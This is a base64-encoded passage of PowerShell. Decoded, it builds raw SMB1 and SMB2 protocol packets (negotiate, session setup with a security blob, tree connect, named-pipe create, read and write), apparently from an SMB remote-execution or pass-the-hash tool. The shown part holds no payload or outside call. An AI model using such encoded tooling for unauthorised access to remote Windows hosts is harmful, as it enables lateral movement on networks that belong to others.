ml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9IaWdoT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X0J5dGVDb3VudCIsJHBhY2tldF93cml0ZV9sZW5ndGgpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0DQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUJDbG9zZVJlcXVlc3QoKQ0Kew0KICAgIHBhcmFtIChbQnl0ZVtdXSRwYWNrZXRfZmlsZV9JRCkNCg0KICAgICRwYWNrZXRfU01CQ2xvc2VSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1NNQkNsb3NlUmVxdWVzdC5BZGQoIlNNQkNsb3NlUmVxdWVzdF9Xb3JkQ291bnQiLFtCeXRlW11dKDB4MDMpKQ0KICAgICRwYWNrZXRfU01CQ2xvc2VSZXF1ZXN0LkFkZCgiU01CQ2xvc2VSZXF1ZXN0X0ZJRCIsJHBhY2tldF9maWxlX0lEKQ0KICAgICRwYWNrZXRfU01CQ2xvc2VSZXF1ZXN0LkFkZCgiU01CQ2xvc2VSZXF1ZXN0X0xhc3RXcml0ZSIsW0J5dGVbXV0oMHhmZiwweGZmLDB4ZmYsMHhmZikpDQogICAgJHBhY2tldF9TTUJDbG9zZVJlcXVlc3QuQWRkKCJTTUJDbG9zZVJlcXVlc3RfQnl0ZUNvdW50IixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU01CQ2xvc2VSZXF1ZXN0DQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUJUcmVlRGlzY29ubmVjdFJlcXVlc3QoKQ0Kew0KICAgICRwYWNrZXRfU01CVHJlZURpc2Nvbm5lY3RSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1NNQlRyZWVEaXNjb25uZWN0UmVxdWVzdC5BZGQoIlNNQlRyZWVEaXNjb25uZWN0UmVxdWVzdF9Xb3JkQ291bnQiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfU01CVHJlZURpc2Nvbm5lY3RSZXF1ZXN0LkFkZCgiU01CVHJlZURpc2Nvbm5lY3RSZXF1ZXN0X0J5dGVDb3VudCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCg0KICAgIHJldHVybiAkcGFja2V0X1NNQlRyZWVEaXNjb25uZWN0UmVxdWVzdA0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U01CTG9nb2ZmQW5kWFJlcXVlc3QoKQ0Kew0KICAgICRwYWNrZXRfU01CTG9nb2ZmQW5kWFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CTG9nb2ZmQW5kWFJlcXVlc3QuQWRkKCJTTUJMb2dvZmZBbmRYUmVxdWVzdF9Xb3JkQ291bnQiLFtCeXRlW11dKDB4MDIpKQ0KICAgICRwYWNrZXRfU01CTG9nb2ZmQW5kWFJlcXVlc3QuQWRkKCJTTUJMb2dvZmZBbmRYUmVxdWVzdF9BbmRYQ29tbWFuZCIsW0J5dGVbXV0oMHhmZikpDQogICAgJHBhY2tldF9TTUJMb2dvZmZBbmRYUmVxdWVzdC5BZGQoIlNNQkxvZ29mZkFuZFhSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1NNQkxvZ29mZkFuZFhSZXF1ZXN0LkFkZCgiU01CTG9nb2ZmQW5kWFJlcXVlc3RfQW5kWE9mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQkxvZ29mZkFuZFhSZXF1ZXN0LkFkZCgiU01CTG9nb2ZmQW5kWFJlcXVlc3RfQnl0ZUNvdW50IixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU01CTG9nb2ZmQW5kWFJlcXVlc3QNCn0NCg0KI1NNQjINCg0KZnVuY3Rpb24gR2V0LVBhY2tldFNNQjJIZWFkZXIoKQ0Kew0KICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9jb21tYW5kLFtJbnRdJHBhY2tldF9tZXNzYWdlX0lELFtCeXRlW11dJHBhY2tldF90cmVlX0lELFtCeXRlW11dJHBhY2tldF9zZXNzaW9uX0lEKQ0KDQogICAgW0J5dGVbXV0kcGFja2V0X21lc3NhZ2VfSUQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfbWVzc2FnZV9JRCkgKyAweDAwLDB4MDAsMHgwMCwweDAwDQoNCiAgICAkcGFja2V0X1NNQjJIZWFkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfUHJvdG9jb2xJRCIsW0J5dGVbXV0oMHhmZSwweDUzLDB4NGQsMHg0MikpDQogICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9TdHJ1Y3R1cmVTaXplIixbQnl0ZVtdXSgweDQwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfQ3JlZGl0Q2hhcmdlIixbQnl0ZVtdXSgweDAxLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfQ2hhbm5lbFNlcXVlbmNlIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9Db21tYW5kIiwkcGFja2V0X2NvbW1hbmQpDQogICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0IixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfRmxhZ3MiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfTmV4dENvbW1hbmQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfTWVzc2FnZUlEIiwkcGFja2V0X21lc3NhZ2VfSUQpDQogICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfVHJlZUlEIiwkcGFja2V0X3RyZWVfSUQpDQogICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9TZXNzaW9uSUQiLCRwYWNrZXRfc2Vzc2lvbl9JRCkNCiAgICAkcGFja2V0X1NNQjJIZWFkZXIuQWRkKCJTTUIySGVhZGVyX1NpZ25hdHVyZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUIySGVhZGVyDQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0KCkNCnsNCiAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgyNCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X0RpYWxlY3RDb3VudCIsW0J5dGVbXV0oMHgwMiwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X1NlY3VyaXR5TW9kZSIsW0J5dGVbXV0oMHgwMSwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfQ2FwYWJpbGl0aWVzIixbQnl0ZVtdXSgweDQwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X0NsaWVudEdVSUQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfTmVnb3RpYXRlQ29udGV4dE9mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9OZWdvdGlhdGVDb250ZXh0Q291bnQiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9EaWFsZWN0IixbQnl0ZVtdXSgweDAyLDB4MDIpKQ0KICAgICRwYWNrZXRfU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfRGlhbGVjdDIiLFtCeXRlW11dKDB4MTAsMHgwMikpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0DQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUIyU2Vzc2lvblNldHVwUmVxdWVzdCgpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X3NlY3VyaXR5X2Jsb2IpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfc2VjdXJpdHlfYmxvYl9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfc2VjdXJpdHlfYmxvYi5MZW5ndGgpDQogICAgJHBhY2tldF9zZWN1cml0eV9ibG9iX2xlbmd0aCA9ICRwYWNrZXRfc2VjdXJpdHlfYmxvYl9sZW5ndGhbMCwxXQ0KDQogICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X1N0cnVjdHVyZVNpemUiLFtCeXRlW11dKDB4MTksMHgwMCkpDQogICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X0ZsYWdzIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfU2VjdXJpdHlNb2RlIixbQnl0ZVtdXSgweDAxKSkNCiAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfQ2FwYWJpbGl0aWVzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfQ2hhbm5lbCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X1NlY3VyaXR5QnVmZmVyT2Zmc2V0IixbQnl0ZVtdXSgweDU4LDB4MDApKQ0KICAgICRwYWNrZXRfU01CMlNlc3Npb25TZXR1cFJlcXVlc3QuQWRkKCJTTUIyU2Vzc2lvblNldHVwUmVxdWVzdF9TZWN1cml0eUJ1ZmZlckxlbmd0aCIsJHBhY2tldF9zZWN1cml0eV9ibG9iX2xlbmd0aCkNCiAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfUHJldmlvdXNTZXNzaW9uSUQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X0J1ZmZlciIsJHBhY2tldF9zZWN1cml0eV9ibG9iKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU01CMlNlc3Npb25TZXR1cFJlcXVlc3QgDQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUIyVHJlZUNvbm5lY3RSZXF1ZXN0KCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfcGF0aCkNCg0KICAgIFtCeXRlW11dJHBhY2tldF9wYXRoX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9wYXRoLkxlbmd0aCkNCiAgICAkcGFja2V0X3BhdGhfbGVuZ3RoID0gJHBhY2tldF9wYXRoX2xlbmd0aFswLDFdDQoNCiAgICAkcGFja2V0X1NNQjJUcmVlQ29ubmVjdFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CMlRyZWVDb25uZWN0UmVxdWVzdC5BZGQoIlNNQjJUcmVlQ29ubmVjdFJlcXVlc3RfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgwOSwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJUcmVlQ29ubmVjdFJlcXVlc3QuQWRkKCJTTUIyVHJlZUNvbm5lY3RSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMlRyZWVDb25uZWN0UmVxdWVzdC5BZGQoIlNNQjJUcmVlQ29ubmVjdFJlcXVlc3RfUGF0aE9mZnNldCIsW0J5dGVbXV0oMHg0OCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJUcmVlQ29ubmVjdFJlcXVlc3QuQWRkKCJTTUIyVHJlZUNvbm5lY3RSZXF1ZXN0X1BhdGhMZW5ndGgiLCRwYWNrZXRfcGF0aF9sZW5ndGgpDQogICAgJHBhY2tldF9TTUIyVHJlZUNvbm5lY3RSZXF1ZXN0LkFkZCgiU01CMlRyZWVDb25uZWN0UmVxdWVzdF9CdWZmZXIiLCRwYWNrZXRfcGF0aCkNCg0KICAgIHJldHVybiAkcGFja2V0X1NNQjJUcmVlQ29ubmVjdFJlcXVlc3QNCn0NCg0KZnVuY3Rpb24gR2V0LVBhY2tldFNNQjJDcmVhdGVSZXF1ZXN0RmlsZSgpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X25hbWVkX3BpcGUpDQoNCiAgICAkcGFja2V0X25hbWVkX3BpcGVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X25hbWVkX3BpcGUuTGVuZ3RoKQ0KICAgICRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGggPSAkcGFja2V0X25hbWVkX3BpcGVfbGVuZ3RoWzAsMV0NCg0KICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9TdHJ1Y3R1cmVTaXplIixbQnl0ZVtdXSgweDM5LDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX0ZsYWdzIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9SZXF1ZXN0ZWRPcGxvY2tMZXZlbCIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfSW1wZXJzb25hdGlvbiIsW0J5dGVbXV0oMHgwMiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfU01CQ3JlYXRlRmxhZ3MiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfRGVzaXJlZEFjY2VzcyIsW0J5dGVbXV0oMHgwMywweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfRmlsZUF0dHJpYnV0ZXMiLFtCeXRlW11dKDB4ODAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX1NoYXJlQWNjZXNzIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9DcmVhdGVEaXNwb3NpdGlvbiIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfQ3JlYXRlT3B0aW9ucyIsW0J5dGVbXV0oMHg0MCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfTmFtZU9mZnNldCIsW0J5dGVbXV0oMHg3OCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9OYW1lTGVuZ3RoIiwkcGFja2V0X25hbWVkX3BpcGVfbGVuZ3RoKQ0KICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX0NyZWF0ZUNvbnRleHRzT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9DcmVhdGVDb250ZXh0c0xlbmd0aCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfQnVmZmVyIiwkcGFja2V0X25hbWVkX3BpcGUpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUNCn0NCg0KZnVuY3Rpb24gR2V0LVBhY2tldFNNQjJSZWFkUmVxdWVzdCgpDQp7DQogICAgcGFyYW0gKFtCeXRlW11dJHBhY2tldF9maWxlX0lEKQ0KDQogICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X1N0cnVjdHVyZVNpemUiLFtCeXRlW11dKDB4MzEsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QuQWRkKCJTTUIyUmVhZFJlcXVlc3RfUGFkZGluZyIsW0J5dGVbXV0oMHg1MCkpDQogICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QuQWRkKCJTTUIyUmVhZFJlcXVlc3RfRmxhZ3MiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X0xlbmd0aCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MTAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QuQWRkKCJTTUIyUmVhZFJlcXVlc3RfT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X0ZpbGVJRCIsJHBhY2tldF9maWxlX0lEKQ0KICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X01pbmltdW1Db3VudCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QuQWRkKCJTTUIyUmVhZFJlcXVlc3RfQ2hhbm5lbCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QuQWRkKCJTTUIyUmVhZFJlcXVlc3RfUmVtYWluaW5nQnl0ZXMiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X1JlYWRDaGFubmVsSW5mb09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdC5BZGQoIlNNQjJSZWFkUmVxdWVzdF9SZWFkQ2hhbm5lbEluZm9MZW5ndGgiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QuQWRkKCJTTUIyUmVhZFJlcXVlc3RfQnVmZmVyIixbQnl0ZVtdXSgweDMwKSkNCg0KICAgIHJldHVybiAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdA0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U01CMldyaXRlUmVxdWVzdCgpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X2ZpbGVfSUQsW0ludF0kcGFja2V0X1JQQ19sZW5ndGgpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfd3JpdGVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X1JQQ19sZW5ndGggKyAyNCkNCg0KICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0LkFkZCgiU01CMldyaXRlUmVxdWVzdF9TdHJ1Y3R1cmVTaXplIixbQnl0ZVtdXSgweDMxLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdC5BZGQoIlNNQjJXcml0ZVJlcXVlc3RfRGF0YU9mZnNldCIsW0J5dGVbXV0oMHg3MCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJXcml0ZVJlcXVlc3QuQWRkKCJTTUIyV3JpdGVSZXF1ZXN0X0xlbmd0aCIsJHBhY2tldF93cml0ZV9sZW5ndGgpDQogICAgJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0LkFkZCgiU01CMldyaXRlUmVxdWVzdF9PZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0LkFkZCgiU01CMldyaXRlUmVxdWVzdF9GaWxlSUQiLCRwYWNrZXRfZmlsZV9JRCkNCiAgICAkcGFja2V0X1NNQjJXcml0ZVJlcXVlc3QuQWRkKCJTTUIyV3JpdGVSZXF1ZXN0X0NoYW5uZWwiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdC5BZGQoIlNNQjJXcml0ZVJlcXVlc3RfUmVtYWluaW5nQnl0ZXMiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdC5BZGQoIlNNQjJXcml0ZVJlcXVlc3RfV3JpdGVDaGFubmVsSW5mb09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJXcml0ZVJlcXVlc3QuQWRkKCJTTUIyV3JpdGVSZXF1ZXN0X1dyaXRlQ2hhbm5lbEluZm9MZW5ndGgiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0LkFkZCgiU01CMldyaXRlUmVxdWVzdF9GbGFncyIsW0J5dGVbXV0oMHgwMCwweDAwLD